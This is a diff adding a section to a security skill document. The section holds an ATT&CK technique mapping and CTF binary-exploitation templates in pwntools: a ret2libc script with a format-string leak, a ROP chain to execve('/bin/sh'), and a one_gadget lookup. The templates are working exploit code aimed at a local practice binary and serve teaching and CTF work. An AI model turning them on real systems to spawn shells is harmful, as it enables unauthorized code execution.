@@ -1913,3 +1913,77 @@ jq '.hits | length' /work/sigma-fp-stats.json
 ### §35.4 Reference: detection-engineering skill
 
 Detection rule craft (Sigma syntax, FP tuning, CI/CD for rules) is owned by `detection-engineering`. This skill's Phase 5 produces *bug-specific* instances; the lifecycle discipline lives in `detection-engineering`.
+
+
+---
+
+## MITRE ATT&CK Mapping + Pwntools Templates (v0.2.5.3)
+
+### ATT&CK 映射（F-PP-001）
+
+| ATT&CK Technique | PoC Activity | Example |
+|------------------|-------------|---------|
+| **T1068 — Exploitation for Privilege Escalation** | 利用内核/服务漏洞提权 | CVE PoC for sudo/Polkit |
+| **T1203 — Exploitation for Client Execution** | 客户端漏洞利用 | 浏览器/Office RCE PoC |
+| **T1190 — Exploit Public-Facing Application** | Web 应用漏洞利用 | SQLi/RCE to shell |
+| **T1059.004 — Unix Shell** | PoC payload 执行 | bash reverse shell |
+| **T1620 — Reflective Code Loading** | 内存中加载 PoC | DLL side-loading |
+
+### CTF Pwn 模板（F-PP-002）
+
+#### ret2libc 模板
+
+```python
+from pwn import *
+
+# context
+context.arch = 'amd64'
+elf = context.binary = ELF('./vuln')
+libc = ELF('./libc.so.6')
+p = process('./vuln')
+
+# gadgets
+pop_rdi = ROP(elf).find_gadget(['pop rdi', 'ret'])[0]
+ret = ROP(elf).find_gadget(['ret'])[0]
+
+# leak libc
+p.sendlineafter(b'> ', b'%p')  # format string leak
+leak = int(p.recvline(), 16)
+libc.address = leak - libc.symbols['printf']
+
+# ret2libc
+payload = flat(
+    b'A' * 72,           # offset to RIP
+    pop_rdi,
+    next(libc.search(b'/bin/sh\x00')),
+    ret,                  # stack alignment
+    libc.symbols['system']
+)
+p.sendline(payload)
+p.interactive()
+```
+
+#### ROP 链模板
+
+```python
+from pwn import *
+
+elf = ELF('./vuln')
+rop = ROP(elf)
+
+# execve("/bin/sh", NULL, NULL)
+bin_sh = next(elf.search(b'/bin/sh\x00'))
+rop.call(elf.symbols['execve'], [bin_sh, 0, 0])
+
+payload = fit({
+    72: rop.chain()  # offset + ROP chain
+})
+```
+
+#### One-gadget RCE
+
+```bash
+one_gadget ./libc.so.6
+# 输出 execve("/bin/sh") 的 offset + 约束条件
+# 常见：0xe3b2e execve("/bin/sh", r15, r12) 约束 [r15]==NULL
+```
